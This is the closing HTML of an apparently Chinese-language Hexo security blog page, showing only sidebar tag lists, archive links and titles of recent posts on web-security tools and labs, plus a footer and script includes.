rel="tag">渗透测试</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/" rel="tag">网络协议</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag">网络安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/" rel="tag">跨站脚本</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/CSRF/" style="font-size: 10px;">CSRF</a> <a href="/tags/CTF%E9%A2%98%E7%9B%AE/" style="font-size: 10px;">CTF题目</a> <a href="/tags/Content-Type/" style="font-size: 10px;">Content-Type</a> <a href="/tags/HTTP/" style="font-size: 13.33px;">HTTP</a> <a href="/tags/HTTPS/" style="font-size: 10px;">HTTPS</a> <a href="/tags/PHP/" style="font-size: 16.67px;">PHP</a> <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 13.33px;">SQL注入</a> <a href="/tags/SSTI/" style="font-size: 10px;">SSTI</a> <a href="/tags/XSS/" style="font-size: 20px;">XSS</a> <a href="/tags/XSStrike/" style="font-size: 10px;">XSStrike</a> <a href="/tags/labs/" style="font-size: 10px;">labs</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 13.33px;">反序列化</a> <a href="/tags/%E5%AE%89%E5%85%A8/" style="font-size: 13.33px;">安全</a> <a href="/tags/%E5%AE%9E%E6%88%98/" style="font-size: 10px;">实战</a> <a href="/tags/%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">对象注入</a> <a href="/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">报错注入</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="font-size: 10px;">数据库</a> <a href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">模板注入</a> <a href="/tags/%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">比较漏洞</a> <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 10px;">渗透测试</a> <a href="/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/" style="font-size: 10px;">网络协议</a> <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="font-size: 10px;">网络安全</a> <a href="/tags/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/" style="font-size: 10px;">跨站脚本</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/05/">May 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/05/">May 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/04/">April 2024</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/xsstrike/">(no title)</a>
          </li>
        
          <li>
            <a href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/sqlmap/">(no title)</a>
          </li>
        
          <li>
            <a href="/2025/05/20/Web/%E7%BB%95%E8%BF%87/%E7%BB%95%E8%BF%87/">(no title)</a>
          </li>
        
          <li>
            <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/Apache%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E+%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/">(no title)</a>
          </li>
        
          <li>
            <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/user.ini/">(no title)</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2025 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>